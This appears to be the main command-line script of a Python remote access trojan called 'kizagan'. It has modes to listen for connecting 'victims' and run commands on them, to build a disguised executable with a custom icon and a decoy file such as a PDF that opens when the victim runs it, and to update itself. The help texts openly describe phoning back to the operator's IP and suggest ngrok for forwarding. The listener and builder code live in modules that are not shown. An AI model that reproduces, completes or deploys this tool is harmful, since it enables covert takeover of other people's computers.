import argparse
from textwrap import dedent
from module import port_listener
from module import builder
from module import update
from module import anim


anim.anim()

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=dedent("Example usage :\n\npython3 kizagan.py control -h\npython3 kizagan.py build -h\npython3 kizagan.py update"), description=dedent("Available mods :\n\ncontrol :Control the clients\nbuild :Build an executable\nupdate :Make an update if available"))
subparsers = parser.add_subparsers(dest="subparser")

server_parser = subparsers.add_parser("control", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=dedent("Example usage :\n\npython3 kizagan.py control -ip <control_server_ip> -p <control_server_port>\npython3 kizagan.py control -ip localhost -p 4444"), description=dedent("Control the clients.Enter the control server IP and port.Wait the clients to connect then execute commands on victims."))
server_parser.add_argument("-ip", "--ip_address", required=True, help="Enter the IP address for control mode.")
server_parser.add_argument("-p", "--port", required=True, help="Enter the port for control mode.")

build_parser = subparsers.add_parser("build", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=dedent("Example usage :\n\npython3 kizagan.py build -ip <control_server_ip> -p <control_server_port> -i <your_icon_file(optional)> -m <your_merge_file(optional)> -n <executable_name(optional)>\npython3 kizagan.py build -ip localhost -p 4444 -i my_icon.ico -m merge.pdf -n executable.exe"), description=dedent("Build an executable file with given parameters.IP and port should be your control server IP and port(you can use port forwarding services like ngrok).Icon file is optional, you can put an icon to executable with -i parameter.Merge file is optional, you can put a merge file to executable file with -m parameter.When the executable opened on victim, the merge file open.You can change your executable file name with -n parameter.Default is victim.exe or victim."))
build_parser.add_argument("-i", "--icon_file", required=False, help="Enter the icon file for executable.(optional)")
build_parser.add_argument("-m", "--merge_file", required=False, help="Enter the merge file for executable.When executable opened, merge file opened too.(optional)")
build_parser.add_argument("-ip", "--ip_address", required=True, help="Enter the IP address.This should be your IP address.Victim will connect to this IP.")
build_parser.add_argument("-p", "--port", required=True, help="Enter the port.This should be your port.Victim will connect to this port.")
build_parser.add_argument("-n", "--name", required=False, help="Enter the executable name.(optional)")

update_parser = subparsers.add_parser("update", formatter_class=argparse.RawDescriptionHelpFormatter, description=dedent("Check update.If available make an update."), epilog=dedent("Example usage :\npython3 kizagan.py update"))

args = parser.parse_args()

if args.subparser == "control":
    try:
        port_listener.listen_port(args.ip_address, int(args.port))
    except ValueError:
        print("[-]Please enter valid port or IP.")
elif args.subparser == "build":
    builder.build(args.ip_address, args.port, args.icon_file, args.merge_file, args.name)
elif args.subparser == "update":
    update.make_update()
else:
    parser.print_help()

